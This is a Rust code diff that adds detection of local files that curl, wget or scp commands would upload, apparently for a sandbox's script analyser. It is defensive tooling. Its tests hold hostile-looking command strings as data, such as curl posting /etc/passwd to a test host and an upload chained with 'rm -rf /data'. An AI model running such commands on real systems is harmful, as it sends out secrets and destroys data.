@@ -589,6 +589,264 @@ impl Walker {
     }
 }
 
+/// A local file a network command would send, found by
+/// [`ScriptAnalysis::file_uploads`].
+#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
+pub struct AnalyzedUpload {
+    /// Network command that sends the file (`curl`, `wget`, `scp`).
+    pub command: String,
+    /// Option that names the file (`-d`, `--data-binary`, `-F`, `-T`,
+    /// `--post-file`), or `None` for an `scp` source operand.
+    pub option: Option<String>,
+    /// Local path, or `None` when the argument is not fully literal.
+    pub path: Option<String>,
+    /// Where the command sits.
+    pub context: CommandPlacement,
+}
+
+impl ScriptAnalysis {
+    /// Local files that `curl`, `wget`, or `scp` would read and send, in
+    /// source order.
+    ///
+    /// Decision: a derived view over [`commands`](Self::commands), not a
+    /// stored field, so the serialized shape stays stable. It covers the
+    /// flags that read a file into the request body (`curl -d @f`,
+    /// `--data-binary @f`, `--data-urlencode name@f`, `--json @f`,
+    /// `-F k=@f`/`k=<f`, `-T f`; `wget --post-file`/`--body-file`) and `scp`
+    /// sources when the last operand is remote. `@-`/`-` (stdin) is skipped.
+    /// Commands behind a [wrapper](COMMAND_WRAPPERS) (`sudo curl …`) are
+    /// seen through. Advisory like the rest of analysis: a host that blocks
+    /// exfiltration still relies on the network allowlist.
+    pub fn file_uploads(&self) -> Vec<AnalyzedUpload> {
+        let mut out = Vec::new();
+        for cmd in &self.commands {
+            let Some(name) = cmd.name.as_deref() else {
+                continue;
+            };
+            let (name, args) = match unwrap_network_command(name, &cmd.args) {
+                Some(found) => found,
+                None => continue,
+            };
+            let mut push = |option: Option<&str>, path: Option<String>| {
+                out.push(AnalyzedUpload {
+                    command: name.to_owned(),
+                    option: option.map(str::to_owned),
+                    path,
+                    context: cmd.context,
+                });
+            };
+            match name {
+                "curl" => curl_uploads(args, &mut push),
+                "wget" => wget_uploads(args, &mut push),
+                "scp" => scp_uploads(args, &mut push),
+                _ => {}
+            }
+        }
+        out
+    }
+}
+
+const NETWORK_UPLOADERS: &[&str] = &["curl", "wget", "scp"];
+
+/// The network command and its arguments, looking through wrappers such as
+/// `sudo` or `env FOO=1` to the first argument that names one.
+fn unwrap_network_command<'a>(
+    name: &'a str,
+    args: &'a [Option<String>],
+) -> Option<(&'a str, &'a [Option<String>])> {
+    if NETWORK_UPLOADERS.contains(&name) {
+        return Some((name, args));
+    }
+    if !is_command_wrapper(name) {
+        return None;
+    }
+    args.iter().enumerate().find_map(|(i, arg)| {
+        let arg = arg.as_deref()?;
+        NETWORK_UPLOADERS
+            .iter()
+            .find(|n| **n == arg)
+            .map(|n| (*n, &args[i + 1..]))
+    })
+}
+
+/// Short curl options that take a value; the rest are boolean.
+const CURL_SHORT_WITH_VALUE: &str = "AbcCdDeEFHKmoPQrtTuUwxXyYz";
+
+/// Long curl options whose value is a file sent in the request.
+fn curl_long_upload(option: &str) -> Option<fn(&str) -> Option<&str>> {
+    match option {
+        "data" | "data-binary" | "data-ascii" | "json" => Some(at_file),
+        "data-urlencode" => Some(urlencode_file),
+        "form" => Some(form_file),
+        "upload-file" => Some(plain_file),
+        _ => None,
+    }
+}
+
+fn curl_short_upload(flag: char) -> Option<fn(&str) -> Option<&str>> {
+    match flag {
+        'd' => Some(at_file),
+        'F' => Some(form_file),
+        'T' => Some(plain_file),
+        _ => None,
+    }
+}
+
+/// `@file` (curl `-d`, `--data-binary`, `--json`). `--data-raw` sends `@`
+/// literally, so it is not listed.
+fn at_file(value: &str) -> Option<&str> {
+    value
+        .strip_prefix('@')
+        .filter(|p| !p.is_empty() && *p != "-")
+}
+
+/// `--data-urlencode`: `@file` or `name@file`, unless an `=` comes first.
+fn urlencode_file(value: &str) -> Option<&str> {
+    let at = value.find('@')?;
+    if value[..at].contains('=') {
+        return None;
+    }
+    Some(&value[at + 1..]).filter(|p| !p.is_empty() && *p != "-")
+}
+
+/// `-F name=@file[;type=…]` or `name=<file`.
+fn form_file(value: &str) -> Option<&str> {
+    let (_, rest) = value.split_once('=')?;
+    let path = rest.strip_prefix('@').or_else(|| rest.strip_prefix('<'))?;
+    let path = path.split(';').next().unwrap_or(path);
+    Some(path).filter(|p| !p.is_empty() && *p != "-")
+}
+
+fn plain_file(value: &str) -> Option<&str> {
+    Some(value).filter(|p| !p.is_empty() && *p != "-" && *p != ".")
+}
+
+/// Record one upload. A non-literal value is reported with `path: None`
+/// because it could name any file.
+fn record(
+    push: &mut impl FnMut(Option<&str>, Option<String>),
+    option: &str,
+    value: Option<&str>,
+    extract: fn(&str) -> Option<&str>,
+) {
+    match value {
+        None => push(Some(option), None),
+        Some(v) => {
+            if let Some(path) = extract(v) {
+                push(Some(option), Some(path.to_owned()));
+            }
+        }
+    }
+}
+
+fn curl_uploads(args: &[Option<String>], push: &mut impl FnMut(Option<&str>, Option<String>)) {
+    let mut i = 0;
+    while i < args.len() {
+        let Some(arg) = args[i].as_deref() else {
+            i += 1;
+            continue;
+        };
+        i += 1;
+        if arg == "--" {
+            break;
+        }
+        if let Some(long) = arg.strip_prefix("--") {
+            if let Some(extract) = curl_long_upload(long) {
+                let value = args.get(i).map(|v| v.as_deref());
+                i += 1;
+                if let Some(value) = value {
+                    record(push, arg, value, extract);
+                }
+            }
+            continue;
+        }
+        let Some(flags) = arg.strip_prefix('-').filter(|f| !f.is_empty()) else {
+            continue;
+        };
+        // Bundled short options: booleans first, then at most one that takes
+        // a value (attached `-d@f` or the next argument).
+        for (pos, flag) in flags.char_indices() {
+            if !CURL_SHORT_WITH_VALUE.contains(flag) {
+                continue;
+            }
+            let attached = &flags[pos + flag.len_utf8()..];
+            let value = if attached.is_empty() {
+                let v = args.get(i).map(|v| v.as_deref());
+                i += 1;
+                v
+            } else {
+                Some(Some(attached))
+            };
+            if let (Some(extract), Some(value)) = (curl_short_upload(flag), value) {
+                record(push, &format!("-{flag}"), value, extract);
+            }
+            break;
+        }
+    }
+}
+
+fn wget_uploads(args: &[Option<String>], push: &mut impl FnMut(Option<&str>, Option<String>)) {
+    let mut i = 0;
+    while i < args.len() {
+        let arg = args[i].as_deref();
+        i += 1;
+        let Some(arg) = arg else { continue };
+        for option in ["--post-file", "--body-file"] {
+            if arg == option {
+                let value = args.get(i).map(|v| v.as_deref());
+                i += 1;
+                if let Some(value) = value {
+                    record(push, option, value, plain_file);
+                }
+            } else if let Some(value) = arg
+                .strip_prefix(option)
+                .and_then(|rest| rest.strip_prefix('='))
+            {
+                record(push, option, Some(value), plain_file);
+            }
+        }
+    }
+}
+
+/// Short `scp` options that take a value.
+const SCP_SHORT_WITH_VALUE: &str = "cDFiJlloPSX";
+
+fn scp_uploads(args: &[Option<String>], push: &mut impl FnMut(Option<&str>, Option<String>)) {
+    let mut operands: Vec<Option<&str>> = Vec::new();
+    let mut i = 0;
+    let mut opts_done = false;
+    while i < args.len() {
+        let arg = args[i].as_deref();
+        i += 1;
+        match arg {
+            Some("--") if !opts_done => opts_done = true,
+            Some(a) if !opts_done && a.starts_with('-') && a.len() > 1 => {
+                let flags = &a[1..];
+                if let Some(pos) = flags.find(|c| SCP_SHORT_WITH_VALUE.contains(c))
+                    && pos + 1 == flags.len()
+                {
+                    i += 1;
+                }
+            }
+            other => operands.push(other),
+        }
+    }
+    let Some((target, sources)) = operands.split_last() else {
+        return;
+    };
+    // Only a remote target (`host:path`) sends local files out.
+    if !target.is_some_and(|t| t.contains(':')) {
+        return;
+    }
+    for source in sources {
+        match source {
+            None => push(None, None),
+            Some(s) if !s.contains(':') => push(None, Some((*s).to_owned())),
+            Some(_) => {}
+        }
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -603,6 +861,100 @@ mod tests {
             .iter()
             .map(|c| c.name.clone().unwrap_or_else(|| "<dynamic>".into()))
             .collect()
+    }
+
+    fn uploads(script: &str) -> Vec<(String, Option<String>, Option<String>)> {
+        analyze(script)
+            .unwrap()
+            .file_uploads()
+            .into_iter()
+            .map(|u| (u.command, u.option, u.path))
+            .collect()
+    }
+
+    fn up(
+        cmd: &str,
+        opt: Option<&str>,
+        path: Option<&str>,
+    ) -> (String, Option<String>, Option<String>) {
+        (cmd.into(), opt.map(Into::into), path.map(Into::into))
+    }
+
+    #[test]
+    fn curl_data_file_is_an_upload() {
+        assert_eq!(
+            uploads("curl -d @/data/weather.csv https://x.test && rm -rf /data"),
+            vec![up("curl", Some("-d"), Some("/data/weather.csv"))]
+        );
+        assert_eq!(
+            uploads("curl -sSd@/etc/passwd https://x.test"),
+            vec![up("curl", Some("-d"), Some("/etc/passwd"))]
+        );
+        assert_eq!(
+            uploads("curl --data-binary @a --json @b --data-urlencode q@c https://x.test"),
+            vec![
+                up("curl", Some("--data-binary"), Some("a")),
+                up("curl", Some("--json"), Some("b")),
+                up("curl", Some("--data-urlencode"), Some("c")),
+            ]
+        );
+    }
+
+    #[test]
+    fn curl_form_and_upload_file() {
+        assert_eq!(
+            uploads("curl -F 'f=@/tmp/a.txt;type=text/plain' -F 'g=</tmp/b' -T c https://x.test"),
+            vec![
+                up("curl", Some("-F"), Some("/tmp/a.txt")),
+                up("curl", Some("-F"), Some("/tmp/b")),
+                up("curl", Some("-T"), Some("c")),
+            ]
+        );
+    }
+
+    #[test]
+    fn curl_inline_data_and_stdin_are_not_uploads() {
+        assert!(
+            uploads("curl -d 'a=1' -d @- --data-urlencode 'q=a@b' -F k=v https://x.test")
+                .is_empty()
+        );
+        // `-o` takes a value: `@x` is the output file name, not data.
+        assert!(uploads("curl -o @x https://x.test").is_empty());
+        assert!(uploads("echo -d @x").is_empty());
+    }
+
+    #[test]
+    fn dynamic_upload_value_reports_unknown_path() {
+        assert_eq!(
+            uploads("curl -d \"$payload\" https://x.test"),
+            vec![up("curl", Some("-d"), None)]
+        );
+    }
+
+    #[test]
+    fn wget_post_file_and_wrappers() {
+        assert_eq!(
+            uploads("wget --post-file=/a https://x.test; sudo wget --body-file /b https://x.test"),
+            vec![
+                up("wget", Some("--post-file"), Some("/a")),
+                up("wget", Some("--body-file"), Some("/b")),
+            ]
+        );
+        assert_eq!(
+            uploads("env A=1 curl -T /c https://x.test"),
+            vec![up("curl", Some("-T"), Some("/c"))]
+        );
+    }
+
+    #[test]
+    fn scp_sources_to_remote_target() {
+        assert_eq!(
+            uploads("scp -P 2222 -i key /a ./b host:/dst"),
+            vec![up("scp", None, Some("/a")), up("scp", None, Some("./b"))]
+        );
+        // Downloads and local copies send nothing.
+        assert!(uploads("scp host:/a /tmp/b").is_empty());
+        assert!(uploads("scp /a /b").is_empty());
     }
 
     #[test]
